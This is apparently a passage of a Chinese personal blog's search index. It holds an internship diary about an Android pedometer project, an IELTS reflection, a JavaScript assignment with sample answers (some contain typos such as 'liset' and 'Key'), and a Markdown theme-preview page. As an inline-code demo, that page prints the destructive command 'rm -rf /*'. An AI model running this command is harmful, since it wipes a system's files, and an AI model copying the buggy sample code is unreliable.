的事情然后出去买饮料，回来组员zzf已经成功实现好友添加功能，然后打算和他一起使用git完成项目，结果自己对 git 使用理解有误，没有成功，暂时先这样吧。  \n晚上回去发现寝室刷漆，味道很重，室友们出去住宾馆，我本来也是想的，但是没钱啊，就去我姐那里住了，我姐怀孕了，明年等外甥(女)出生我就只能看他两眼然后就走了(如果那个时候出国的话)\n\n### 第八天(7/17)\n\n上午把组员lmj模仿写的自定义的显示步数的控件加到 fragment 里面，前天问Dylan为什么 StepService 里面要加那么多记录步数的变量。  \n \n![我的问题](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627163758.jpg)\n\n然后他可能太忙了，还没有回，我就先直接按照他的写法把这些变量加进去了。然后安卓滑动悬浮置顶的效果看了一下，想把这个效果加进去。  \n下午继续添加一些小功能和页面，组员tl写了一个 videoview 为背景的欢迎页面，下午收工后我去 #507 研究了一会加到应用上了。\n\n### 第九天(7/18)\n\n昨天加了组员tl的欢迎界面，感觉很酷炫，但是它注册的时候没有确认密码这一栏，感觉不爽就只有舍弃它自带的动画，写一个按钮进去登录 activity 里。上午老师还要求明天项目中期展示。\n下午自定义了一个 SettingItem ，然后初始化多个加入到设置的 fragment 里，感觉好蠢，感觉自己写的东西就是要 UI 没 UI ，要优化没优化。\n\n### 第十天(7/19)\n\n今天是最难过的一天。  \n上午到实验室，准备项目展示，自己都不知道改了什么，程序突然就闪退，而且是打开直接闪退，我们组是第二个展示的，顿时感觉很慌，修改来修改去不知道要干些什么，好久都没有这种感觉了，第一次考雅思都没有这么魂不守舍过。找经理说了说，叫他给我们安排在下午，上午继续在修改，中间有个同学借我电脑去做展示(他电脑没有 vga 接口)，用完和我聊了两句，知道我的情况后，好心地帮我查了错，然后就给查出来了，又教了我一招，一个是我加进项目的图片太大，动画都卡顿，最后报错 outofmemoryerror ，另外一个是自己封装使用 sharedpreferences 的工具类忘记实例化，使用过程报错 nullpointerecxeption ，而且好像 fragment中getActivity() 方法不能放在点击事件里，不然就闪退，我也不知道为什么。  \n下午第一个上去展示，整个人都是六神无主的，展示完才知道自己写得有多垃圾，唉，下午心慌，效率极低，加上中午午觉没睡好，第一次感觉到来自IT的巨大压力。中途组员zzh叫我帮他看错误，也心不在焉，今天真的是废掉的一天，整理一下明天整装焕发。提高效率！效率！！\n\n### 第十一天(7/20)\n\n上午添加把计步数据添加到数据库中，并设置 30m 更新一次(更新频率有点快了，不过可以调)，然后就开始漫无目的了，打算今天把组员zzf写的好友功能添加到应用里，感觉好像又做不完了。。\n下午添加了查找好友并关注功能。晚上去搬寝室了（学校了解情况后安排了寝室）。\n\n### 第十二天(7/21)\n\n上午写了一个 recyclerview 来做好友排名功能，中途软酷的老总来谈话了，和我们聊了一会，给了一点鼓励，解决了一点我的困惑。  \n下午因为 recyclerview 使用不熟练就替换成 listview 了(我原来看的第一行代码第一版)，然后实现了展示关注好友步数的功能，今天界面，然后又把在主界面展示历史步数的功能给加了，此时界面很丑陋，使用的纯安卓控件(按钮，listview 之类什么的都没有自定义)。明天再改界面。\n\n### 第十三天(7/22)\n\n今天上午是打算开始改界面的，开始没多久，现场经理就说要检查一下目前项目的情况，哇！我这这么丑的东西怎么拿得出手，没办法，硬着头皮给他看了，他很尴尬，我也很难过，他说我这样明天项目展示怕是要翻水水。。。我就跟他说我还在改，他说界面现在改怕是来不及了，叫我项目展示的时候把大小功能全都展示出来。。。我很绝望，没办法，继续努力修改中。  \n下午经理又布置任务要提交项目最终文档，啊人都崩溃了，好在经过上午努力，界面问题不是很大了，然后去网上找了奖牌优化一下步数排行的显示。  \n到了晚上当然在加班写文档啊。。。本来中午就没午睡，下午又写了一下午，晚上回去先睡了一个小觉然后又开始赶。deadline 永远都这么压迫人。\n\n### 第十四天(7/23)\n\n开始项目展示了，莫名有点紧张，和经理说帮忙安排到第五或者第六个小组展示，但我们展示的时候老总正好在和一个老师聊天，看我的只有经理，这样老总就不会在我演示完东问西问了，演示完经理问了我几个问题，我避开了项目的 bug，给他留下了一个好印象，另外昨天他看我的丑界面已经被我优化得差不多了，他也很吃惊，人都是被逼出来的。然后老总过来大致看了看项目，感觉还不错，对我表示赞赏，心里送了一口气(说实话我感觉现在前面做演示的时候我的表现还不错)。\n下午是上午剩下的小组继续做展示，展示完老总讲话，说了一下这个软件工程专业前的背景，其他的也聊了一下。我还做了一点小笔记🤓，然后就差不多收工了，经理又布置了完成第二周项目周报。\n晚上待在实验室，打算写周报，中途一个研究生学长过来找我聊了一会天，(聊天内容就不说了)也把我在实验室间断没网的问题解决了。周报完成提交后，给项目代码加了略详细且有条理的注释，并修改了之前文档里面存在的一些错误，然后就回寝室了。\n\n### 第十五天(7/24)\n\n今天应该是上午公司内部项目评优，下午学校开会，公司间评优，第一名还有800元奖金，显然跟我无缘。\n内部评优我得了一个个人优秀奖，本来还以为能获得优秀项目奖的，不过也知足了，再多想就有点贪心不足蛇吞象了。\n下午我就回家了，车上得知我们公司一个小组得了第一名(他们项目做的怎么样我不知道，但是展示环节真的是强)，恭喜恭喜。\n\n## 小结\n\n这是我第一次这么稍显正式的环境里写代码，最后的成果并不令人满意。过程中我组长的职责也欠缺实行，其实没什么说的，这次实习让我见识到了技术上自己有多菜，好在这学期雅思过了，下一学年好好开始写代码。\n\n## 最后\n\n前面三个学期都有项目设计，做得我自己都感觉拿不出手，虽然老师分数上给过了，我心里都是内疚的。  \n我现在就当我项目设计没有做，下个学年把这些都补上。  \n\n- tj老师的项目 - 番茄时钟计时器\n- tj老师的项目 - 安卓语音聊天机器人\n- wxn老师的项目 - 安卓新闻和评论客户端  \n  把这次实训也加上吧\n- yy经理的项目 - 安卓计步器","tags":["untagged"]},{"title":"雅思回顾","url":"/2017/06/17/ielts-lookback/","content":"\n> First thing's first  \n> I'ma say all the words inside my head  \n> I'm fired up and tired of the things have been.\n\n第一次雅思成绩  \n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627162053.png) \n\n第二次雅思成绩  \n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627162100.png)\n\n> Second thing's second  \n> Don't you tell me what you think that I can be  \n> I'm the one at the sail  \n> I'm the master of my sea\n\n我只是万千考鸭中最普通的一只，二考的成绩可能算是比较令人满意的。  \n我没有什么考试技巧要和大家分享，我只是想写写考这次雅思的一些感想（想到哪写到哪）\n\n先来说下这次成绩吧。如果不是阅读填补了我心里的空缺，听力要遗憾好久，二考听力较一考没有进步，而且关键是我复习主练听力的，平均下来，听两个 test 听力，才会做一个 test 的阅读。这次听力和阅读分数如果互换，就是最符合我的预期了。实际上考完笔试，稍稍对了对答案，就知道听力可能只有 7 了。阅读是比较意外的，考完感觉还不错也没多想，不过也应该和 6.3 的题目偏简单有关系吧。写作很感谢老师，考试前两周正好结课，正好把作文讲完，小作文和大作文都讲的很有条理，轮廓结构很清晰，想拿高分就看怎么写了，这次作文进步 1.5 分我认为算是单项里面进步最大的（作文进步 1.5 分比阅读进步 2 分应该还是要难吧）。口语的话应该是正常的水平吧，复习的时候没有想怎么去准备，因为觉得这个是准备不完的，所以考口语前一天把几个高频话题提纲写了一下。考试 part 2 抽到的题目是 ——\n\nDescribe a leisure activity on or by the sea that you would like to try, you should say:\n\n- What the activity is?\n- What preparation you need to do?\n- How easy it is to do?\n\n然后 part 3 就是根据 part 2 扩展一些话题(sea, beach)来讨论，比如说 \"Do you think that children are more likely to spend time on beach than old people, why?\"\n\n我的计划就是上半年把雅思过了，后面这段时间要准备期末考试，所以提前到第十六周考。四月初考完蓝桥杯省赛斩钉截铁报名 6.3 雅思，不能再拖了。（中间省赛过了，进了国赛，日期定为 5.27，差一点就和雅思冲突了，要是冲突了，我想应该会放弃国赛吧）接下来就是复习备考，两个目标 —— 蓝桥杯和雅思，其中雅思为首，必要情况下搁置蓝桥杯。努力了怎么会白费呢？进考场之前我就想好了，这次雅思过了就很舒服。没过至少我也应该可以看见进步，只能说明努力不够，暑假再准备再考，下一场都已经看好时间了 (8.26)。\n\n> Third thing's third  \n> Send a prayer to the ones up above  \n> All the hate that you've heard has turned your spirit to a dove\n\n第一次考试总分差 0.5 分到 6，挺可惜的，原本想复议的，后来放弃了。第一个，复议要 1000 块！！！虽然复议成功可退还，但要是失败呢？不敢冒这个险；第二个，复议就算成功了也只有 6 分，为什么不再考一次，还有机会考得更高呢（事实证明：我的选择是正确的）\n\n口语考试戴的雅思白手环我还留着，笔试的红手环要被回收，考试完回收的时候我问了句 \"Can I keep this as a souvenir?\"，\"Sorry, you can't\"。。。还是挺想留下来当纪念的。\n\n考完回学校的路上，赶紧打开手机，下载网易云音乐听歌，为了雅思，我把所有歌都删除了，换成了雅思听力，这将近两个月的时间内，全是 \"Now listen carefully and answer question one to forty!\"\n\n下载的第一首歌就是 Believer - Imagine Dragons，我标注出来的就是这首歌的歌词，我也不知道为什么是这首歌，只是走出考场这首歌的旋律始终在我脑中回荡 - \"You break me down, you build me up, believer, believer!\"。大概是因为我是一个 believer who believe \"You reap what you sow\" 吧。\n\n下面就是这首歌，你可以点击听一下\n\n<audio src=\"/assets/Imagine Dragons - Believer.mp3\" controls=\"controls\" preload=\"auto\"></audio>\n\n> Last thing's last  \n> By the grace of the fire and the flames  \n> You're the face of the future  \n> The blood in my veins\n\n大部分时间留给了雅思，蓝桥杯没有取得想要的成绩是一个遗憾，有舍必有得吧。<br>目前来说的话，雅思学习可能要暂时告一段落了。<br>通过雅思，这两个月养成了一个良好的习惯，就是早睡早起，希望接下的日子里能够继续保持。还有任务规划和时间分配还存在问题，还能够提升。\"You could have done better.\"\n\n今天考六级，同学们说你雅思都 7 分了还考什么六级啊。。。这是我第三次考六级了，第一次没过，第二次弃考了，第三次不多想了，还是一样，能过最好，过不了再说，下学期不想再考了。\n\n**接下来学年的目标 -- Coding!**","tags":["IELTS"]},{"title":"Assignment Sample Answer","url":"/2017/06/08/sample-answer/","content":"\n这两周来自 [UWLAX](https://www.uwlax.edu/) 的外教 [Kenny Hunt](http://charity.cs.uwlax.edu/#/) 对我们进行两周的 [Web Programming](http://charity.cs.uwlax.edu/scun/web/) 课程教学,介绍基本语法用法后，布置了一篇作业，下面附上 Sample Answer。\n\n这是作业的原链接 => [JavaScript Assignment](http://charity.cs.uwlax.edu/scun/web/assignments/hw1/)\n\n为防止外教回国后，页面被删除无法访问，我这里把作业存在 [这篇文章](https://greenlihui.github.io/2017/06/08/javascript-assignment/) 里了\n\n## Risk\n```JavaScript\nfunction risk(height, weight, sex) {\n  var meterOfHeight = height * 0.0254;\n  var kiloOfWeight = weight * 0.4536;\n  var bmi = kiloOfWeight / Math.pow(meterOfHeight, 2);\n  return ( sex == 'M' && (bmi < 20.4 || bmi > 31.9) ) ||\n  ( sex == 'F' && (bmi < 19.4 || bmi > 27.6) );\n}\n```\n\n## Hail Caesar\n```JavaScript\nfunction roman(number) {\n  var numberToRoman = {\n    1 : \"I\",\n    2 : \"II\",\n    3 : \"III\",\n    4 : \"IV\",\n    5 : \"V\",\n    6 : \"VI\",\n    7 : \"VII\",\n    8 : \"VIII\",\n    9 : \"IX\",\n    10 : \"X\"\n  };\n  var romanToNumber = {\n    \"I\" : 1,\n    \"II\" : 2,\n    \"III\" : 3,\n    \"IV\" : 4,\n    \"V\" : 5,\n    \"VI\": 6,\n    \"VII\" : 7,\n    \"VIII\" : 8,\n    \"IX\" : 9,\n    \"X\" : 10\n  };\n  if (typeof number == 'number') {\n    return numberToRoman[number];\n  } else if (typeof number == 'string') {\n    return romanToNumber[number.toUpperCase()];\n  } else {\n    return undefined;\n  }\n}\n```\n\n## Follow the Leader\n```JavaScript\nfunction lettersThatFollow(text, ch) {\n  var result = \"\";\n  var phrases = text.split(ch).slice(1);\n\n  phrases.map(ph => ph[0]).forEach(c => {\n    if ( c && result.indexOf(c) < 0 ) {\n      result += c;\n    }\n  });\n  return result;\n}\n```\n\n## Props to JavaScript\n```JavaScript\nfunction props(list, propertyName) {\n  return list.map(val => val[propertyName]);\n}\n```\n\n## JavaScript to HTML\n```JavaScript\nfunction toHTML(list) {\n  if (typeof list != 'object') {\n    return \"<li>\" + list + \"</li>\";\n  } else {\n    return \"<ol>\" + list.map(toHTML).join('') + \"</ol>\";\n  }\n}\n```\n\n## One Step After The Other\n```JavaScript\nfunction sequence(start, step) {\n  var count = 0;\n\n  return function() {\n    return start + step * count++;\n  };\n}\n```\n\n## Over and Over Again\n```JavaScript\nfunction repeat(text, n) {\n  return repeatf(() => text, n).join('');\n}\n```\n\n## Over and Over Again and Again\n```JavaScript\nfunction repeatf(f, n) {\n  var result =[];\n  for (var i = 0; i < n; i++) {\n    result.push(f());\n  }\n  return result;\n}\n```\n\n## The Matchmaker\n```JavaScript\nfunction matchmaker(obj) {\n  return function (object) {\n    for (var key in obj) {\n      if (obj[key] != object[Key]) {\n        return false;\n      }\n    }\n    return true;\n  };\n}\n```\n\n## Breaking Up is Hard To Do\n```JavaScript\nfunction breakup(list, partitioner) {\n  var result = {};\n  list.forEach(val => {\n    var key = partitioner(val);\n    if (! result.hasOwnProperty[key]) {\n      result[key] = [];\n    }\n    result[key].push(val);\n  });\n  return result;\n}\n```\n\n## All For One and One For All\n```JavaScript\nfunction eachOne(list) {\n  for (var i = 0; i < liset.length; i++) {\n    if (!list[i]) {\n      return list[i];\n    }\n  }\n  return true;\n}\n```\n\n## NoSql Query\n```JavaScript\nfunction noSql(list, query) {\n  return list.filter(matchmaker(query));\n}\n```\n\n## Once and Only Once\n```JavaScript\nfunction justOnce(f) {\n  var hasBeenCalled = false;\n  var value;\n\n  return function() {\n    if(hasBeenCalled) {\n      return value;\n    } else {\n      value = f();\n      hasBeenCalled = true;\n      return value;\n    }\n  };\n}\n```\n\n## 我的打分\n上面是老师评讲题目后给出的参考答案，我原本提交的答案只拿了一个 AB\n这是老师给我的打分\n> Here are my notes on your assignment: \n> <br>\n> 1\\) the code is well written\n> 2\\) You have a couple of variables named \"Key\".  Never start a variable name with a capital letter.\n> 3\\) The breakup function is almost correct. You need to be carful about truthiness - in this case it is a problem with \"result[key] ? ...\".  Try result.hasOwnProperty(key) ?  \n> <br>\n> Score: 90% (the justOnce function is not given) This is an \"AB\".\n\n## 文件\n[我提交的作业](/assets/my-homework.js) 和 [老师的答案](/assets/sample%20answer.js)\n","tags":["UWLAX","JavaScript"]},{"title":"JavaScript Assignment","url":"/2017/06/08/javascript-assignment/","content":"\n# 来自外教的 JavaScript 作业\n[原作业网址](http://charity.cs.uwlax.edu/scun/web/assignments/hw1/)\n\n## Overview\nIn this assignment you will write several JavaScript functions. These function require that you use most aspects of the language; conditionals, loops, arrays, strings and functions-as-first-class citizens. Each of the functions must be placed within a single file named homework1.js which is the only deliverable for this assignment.\n\n### Risk\n`risk(height, wieght, sex)`\n\nThis function accepts three inputs. The first input is a number that denotes the height (in inches) of a person. The second input is a number that denotes the weight of a person (in pounds). The third input is a string that denotes the sex of a person. The sex is “M” for male and “F” for female. This function returns true if the person is at risk and false if they are not. A person is at risk if\n\n- they are male and have a BMI less than 20.4 or greather than 31.9\n- they are female and have a BMI less than 19.4 or greather than 27.6\n\nBody Mass Index (BMI) is defined as a persons weight (in kilograms) divided by the square of their height (in meters).\n\n**Examples**\n- risk(71.5, 175.3, 'M') => false\n- risk(65.2, 230.5, 'M') => true\n- risk(65.2, 110, 'F') => true\n\n### Hail Caesar\n`roman(number)`\n\nThis function accepts a single input. The input is either a number or a String. If it is a number, it is a base-10 number in the interval [1, 10]. If it is a String, it is a case-insensitive roman-numeral in the interval [1, 10]. If the input is a Number, in [1, 10], the function returns the corresponding Roman numeral as a String. If the input is a roman-numeral String in the interval [1, 10], then the function returns the corresponding decimal number. This function returns undefined for all other usages.\nStatue of Caesar\n\n**Examples**\n- roman('VII') => 7\n- roman('vIi') => 7\n- roman( 9 ) => 'IX'\n- roman( 128 ) => undefined\n- roman( 'Hello' ) => undefined\n- roman( roman ) => undefined\n\n### Follow the Leader\n`lettersThatFollow( text, ch )`\n\nThis function accepts two strings: a string named text and a string name ch. The function must search through the text for all occurrences of ch in text and, for each occurrence of ch, return the character that immediately follows ch in text if such a character exists. The order of the characters in the output string is undefined. The result must be a string that contains no duplicate characters.\n\n**Examples**\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \"a\") => \"rutn\"\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \"z\") => \"\"\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \".\") => \"\"\n\n### Props to JavaScript\n`props( list, propertyName)`\n\nThis function takes a list of elements and a propertyName string as input. The function returns a list that is generated by obtaining the property-named value of an input element. If a list element doesn't have a property of the specified name, then its value is given as undefined.\n\n**Examples**\n- var testing = [{ a:3, b:‘Cat’, c:true }, 13, { a:12, b:‘Hat’, c:false }, { cat:3, hat:‘3’, rat:false } ];\n- props( testing, ‘b’ ) => [ ‘Cat’, undefined, ‘Hat’, undefined ]\n- props( testing, ‘a’ ) => [3, undefined, 12, undefined ]\n- props( testing, ‘cat’ ) => [undefined, undefined, undefined, 3 ]\n\n### JavaScript to HTML\n`toHTML( list )`\n\nThis function takes an array of elements as its only input. The function converts the input list into a valid HTML ordered list. If any element of the list is a list, the output is a nested list of elements such that the first element of the inner list is an item in the outer list and every other element is within the nested list.\n\n**Examples**\n- toHTML( [] ) =&gt; '&lt;ol&gt;&lt;/ol&gt;'\n- toHTML( [1, 2] ) =&gt; '&lt;ol&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;/ol&gt;'\n- toHTML( [1, 2, [3, 4, 5], 6] ) =&gt;\n\"&lt;ol&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;li&gt;3&lt;ol&gt;&lt;li&gt;4&lt;/li&gt;&lt;li&gt;5&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;li&gt;6&lt;/li&gt;&lt;/ol&gt;\"\n\n### One Step After The Other\n`sequence( start, step )`\n\nThis function takes two numeric inputs, start and stop, and returns a function of no inputs. The resulting function will generate a sequence of values beginning with start and offset by step Each function call will generate the next value in the sequence.\n\n**Examples**\n- var x = sequence( 3, 15 );\n- [ x(), x(), x() ] => [ 3, 18, 33 ]\n- var y = sequence( 28, -5 );\n- [ y(), y(), y() ] => [ 28, 23, 18 ]\n\n### Over and Over Again\n`repeat( text, n )`\n\nThis function accepts a string (text) and an integer number (n). The function must return a string that has n repetitions of text. If n is non-positive this function must return the empty string.\n\n**Examples**\n- repeat( \"cow\", 3 ) => \"cowcowcow\"\n- repeat( \"alf\", 10 ) => \"alfalfalfalfalfalfalfalfalfalf\"\n- repeat( \"repeat\", -3 ) => \"\"\n\n### Over and Over Again and Again\n`repeatf( f, n )`\n\nThis function accepts a function of no arguments ( f ) and an integer number ( n ). The function must return a list that contains the results of n executions of f. If n is non-positive this function must return the empty list.\n\n**Examples**\n- repeatf( () => { return \"cow\"; } , 3 ) => [ \"cow\", \"cow\", \"cow\" ]\n- repeatf( function() { return 3; }, 2 ) => [ 3, 3 ]\n- repeatf( sequence( 3, 15 ), 3 ) => [ 3, 18, 33 ]\n\n### The Matchmaker\n`matchmaker( obj )`\n\nThis function accepts an object (obj) and returns a predicate function. The predicate function accepts a single input and returns true if the input contains all of the key/value properties of obj.\n\n**Examples**\n- var m = matchmaker( { a : 'b', c : 3 } );\n- m( { a : 'b', c : 3, d : true } ) => true\n- m( { a : 'b', c : 4, d : true } ) => false\n- m( 328 ) => false\n\n### Breaking Up is Hard To Do\n`breakup( list , partitioner )`\n\nThis function accepts two inputs: a list of elements and a function that accepts an element from the list. The result is an object whose properties correspond to the items returned by the partitioner and whose values are lists of elements that generated that property.\n\n**Examples**\n- breakup( [ 1, 2, 3, 5, 6, 7 ], (x) => { return x % 2 == 0; } ) => { true:[ 2, 6 ], false:[ 1, 3, 5, 7 ] }\n- breakup( [ 1.3, 5.1, 1.1, 4.3, 5.5 ], Math.floor ) => { 1:[ 1.3, 1.1 ], 4:[ 4.3 ], 5:[ 5.1, 5.5 ] }\n-  breakup( [“cat”, “bat”, “rat”, “horse”, “pony”], function(s) { return s.length; } ) => { 3:[“cat”, “bat”, “rat”], 4:[“pony”], 5:[“horse”] }\n\n### All For One and One For All\n`eachOne( list )`\n\nThis function accepts a list of elements as it’s only input. The method returns ‘true’ if every element in the list is truthy; otherwise it returns the first falsey element.\n\n**Examples**\n- eachOne( [ 0, 1, 2, 3 ] ) => 0\n- eachOne( [ 1, 2, 3, 4 ] ) => true\n- eachOne( [ 'a', [], 3, '', null ] ) => ''\n\n### NoSql Query\n`noSql( list, query )`\n\nThis function accepts a list of elements and an object known as the query. The method returns a list of all elements that have each of the key/value properties of the query.\n\n**Examples**\n- var objects = [ { public : true, name : \"Lion King\" }, { public : true, name : 'Dumbo' }, { public : false, name : 'Lion King' }, { name : 'Xeon', rating : 5 } ];\n- noSql( objects, { public:true } ) => [ { public:true, name:'Lion King' }, { public:true, name:'Dumbo'}]\n- noSql( objects, { name:'Lion King' } ) => [ { public:true, name:'Lion King' }, { public:false, name:'Lion King'}]\n- noSql( objects, { rating:5 } ) => [ { name:'Xeon', rating:5 } ]\n- noSql( objects, { public:false, name:'Dumbo' } ) => [ ]\n\n### Once and Only Once\n`justOnce( f )`\n\nThis function accepts a function ‘f’ as input and creates a version of the function that can only be called one time. Repeated calls to the resulting function will return the value from the original call.\n\n**Examples**\n- var a = justOnce( Math.max );\n- a( 3, 12 ) => 12\n- a( 51, -2) => 12\n- a( 6 ) => 12\n- a( ) => 12\n- var b = justOnce( function() { return new Date(); } );\n- b( ) => “Wed Aug 20 2015 08:28:49 GMT-0500 (CDT)”\n- b( ) => “Wed Aug 20 2015 08:28:49 GMT-0500 (CDT)”\n- b( 33 ) => “Wed Aug 20 2015 08:28:49 GMT-0500 (CDT)”\n- b( “a”, “b”, “c”) => “Wed Aug 20 2015 08:28:49 GMT-0500 (CDT)”\n","tags":["UWLAX","JavaScript"]},{"title":"主题预览","url":"/2017/01/01/theme-preview/","content":"\n# 标题\n# 这里是 h1\n\n## 这里是 h2\n\n### 这里是 h3\n\n#### 这里是 h4\n\n##### 这里是 h5\n\n###### 这里是 h6\n\n```\n# 这里是 h1\n## 这里是 h2\n### 这里是 h3\n#### 这里是 h4\n##### 这里是 h5\n###### 这里是 h6\n```\n\n## 段落\n\n段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落一段落\n\n段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落二段落\n\n## 超链接\n\n[baidu](https://www.baidu.com/)\n\n```\n[baidu](https://www.baidu.com/)\n```\n\n## 引用\n### 单行\n> 这里是引用\n\n```\n> 这里是引用\n```\n\n### 嵌套\n> Blockquotes can also be nested...\n> > ...by using additional greater-than signs right next to each other...\n> >\n> > > ...or with spaces between arrows.\n\n```md\n> Blockquotes can also be nested...\n>> ...by using additional greater-than signs right next to each other...\n> > > ...or with spaces between arrows.\n```\n\n## Emphasis\n**This is bold text**\n\n__This is bold text__\n\n*This is italic text*\n\n_This is italic text_\n\n~~Strikethrough~~\n\n```\n**This is bold text**\n\n__This is bold text__\n\n*This is italic text*\n\n_This is italic text_\n\n~~Strikethrough~~\n```\n\n## 列表\n\n### 无序列表\n\n+ aaa\n- bbb\n- ccc\n  * ddd\n  - eee\n    - fff\n  * ggg\n- aaa\n\n```md\n+ aaa\n- bbb\n- ccc\n  * ddd\n  - eee\n    - fff\n  * ggg\n- aaa\n```\n\n\n### 有序列表\n\n1. aaa\n2. bbb\n3. ccc\n   1. aaa\n   2. bbb\n      1. ccc\n   3. ccc\n4. ddd\n\n```md\n1. aaa\n2. bbb\n3. ccc\n   1. aaa\n   2. bbb\n      1. ccc\n   3. ccc\n4. ddd\n```\n\n## 分割线\n\n---\n\n***\n___\n\n```md\n---\n\n***\n\n___\n```\n\n## 图片\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png)\n\n```md\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png)\n```\n\n## 代码行\n\n这是一段文字`rm -rf /*`这是一段文字\n\n```\n这是一段文字`rm -rf /*`这是一段文字\n```\n\n## 代码块\n\n\n```javascript\nvar addLoadEvent = function (func) {\n  var oldonload = window.onload\n  if (typeof window.onload != 'function') {\n    window.onload = func\n  } else {\n    window.onload = function () {\n      oldonload()\n      func()\n    }\n  }\n}\n```\n\n\n## 表格测试\n\n| Header | Header | Header |\n| ------ | ------ | ------ |\n| aaa    | bb     | ccc    |\n| test   | hello  | hi     |\n\n```md\n| Header | Header | Header |\n| ------ | ------ | ------ |\n| aaa    | bb     | ccc    |\n| test   | hello  | hi     |\n```\n\n## Markdown-it Plugins\n\n### Task List\n- [ ] Mercury\n- [x] Venus\n- [ ] Comet Haley\n\n```md\n- [ ] Mercury\n- [x] Venus\n- [ ] Comet Haley\n```\n\n### Emoji\n:frowning: :blush: :confused:\n\n```md\n:frowning: :blush: :confused:\n```\n\n使用方法\n1. 在 [EmojiCopy](https://www.emojicopy.com/) 中复制粘贴\n2. [Emoji Cheetsheet](https://github.com/markdown-it/markdown-it-emoji/blob/master/lib/data/full.json)\n3. [Emoji Shortcut](https://github.com/markdown-it/markdown-it-emoji/blob/master/lib/data/shortcuts.js)\n\n### 上标和下标\n19^th^\n\nH~2~O\n\n```md\n19^th^\nH~2~O\n```\n\n### Image Size\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png =100x100)\n\n```md\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png =100x100)\n```\n\n### Attributes\n给这个段落添加一个 class {.red}\n<style>.red{color: red;}</style>\n\n这个段落添加一个属性 {style=\"color:green\"}\n\n```md\n给这个段落添加一个 class {.red}\n<style>.red{color: red;}</style>\n\n这个段落添加一个属性 {style=\"color:green\"}\n```\n\n### Footnotes\nFootnote 1 link[^first].\n\nFootnote 2 link[^second].\n\nInline footnote^[Text of inline footnote] definition.\n\nDuplicated footnote reference[^second].\n\n[^first]: Footnote **can have markup**\n\n    and multiple paragraphs.\n\n[^second]: Footnote text.\n\n```md\nFootnote 1 link[^first].\n\nFootnote 2 link[^second].\n\nInline footnote^[Text of inline footnote] definition.\n\nDuplicated footnote reference[^second].\n\n[^first]: Footnote **can have markup**\n\n    and multiple paragraphs.\n\n[^second]: Footnote text.\n```\n\n### 缩写\nThis is HTML abbreviation example.\n\nIt converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.\n\n*[HTML]: Hyper Text Markup Language\n\n```md\nThis is HTML abbreviation example.\n\nIt converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.\n\n*[HTML]: Hyper Text Markup Language\n```\n\n### Mark\n==mark==\n\n```md\n==mark==\n```\n\n### Container\n::: info\n**INFO**\nhere be info\n:::\n\n::: success\n**SUCCESS**\nhere be success\n:::\n\n::: warning\n**WARNING**\nhere be warning\n:::\n\n::: danger\n**DANGER**\nhere be danger\n:::\n\n```md\n::: info\n**INFO**\nhere be info\n:::\n\n::: success\n**SUCCESS**\nhere be success\n:::\n\n::: warning\n**WARNING**\nhere be warning\n:::\n\n::: danger\n**DANGER**\nhere be danger\n:::\n```\n\n## 数学公式\n### 行内公式\n$\\frac{\\partial u}{\\partial t}\n= h^2 \\left( \\frac{\\partial^2 u}{\\partial x^2} +\n\\frac{\\partial^2 u}{\\partial y^2} +\n\\frac{\\partial^2 u}{\\partial z^2}\\right)$\n\n```md\n$\\frac{\\partial u}{\\partial t}\n= h^2 \\left( \\frac{\\partial^2 u}{\\partial x^2} +\n\\frac{\\partial^2 u}{\\partial y^2} +\n\\frac{\\partial^2 u}{\\partial z^2}\\right)$\n```\n\n### 行间公式\n$$\n\\\\begin{aligned}\nx\\_{f} = & x\\_0+k(x-x\\_0) \\\\\\\\\ny\\_{f} = & y\\_0+k(y-y\\_0) \\\\\\\\\ns\\_{f} = & k\n\\\\end{aligned}\n$$\n\n```md\n\\\\begin{aligned}\nx\\_{f} = & x\\_0+k(x-x\\_0) \\\\\\\\\ny\\_{f} = & y\\_0+k(y-y\\_0) \\\\\\\\\ns\\_{f} = & k\n\\\\end{aligned}\n```\n\n## 插入 iframe\n<iframe src=\"//player.bilibili.com/player.html?aid=285774045&bvid=BV1uf4y127Ab&cid=196316963&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n\n## 插入 html\n\n<div id=\"html\"></div>\n<style>\n#html{\n    height: 30px;\n    background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,255,0,1) 50%, rgba(0,0,255,1) 100%);\n    border-radius: 4px;\n}\n</style>\n\n```html\n<div id=\"html\"></div>\n<style>\n#html{\n    height: 30px;\n    background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,255,0,1) 50%, rgba(0,0,255,1) 100%);\n    border-radius: 4px;\n}\n</style>\n```\n","tags":["hexo"]}]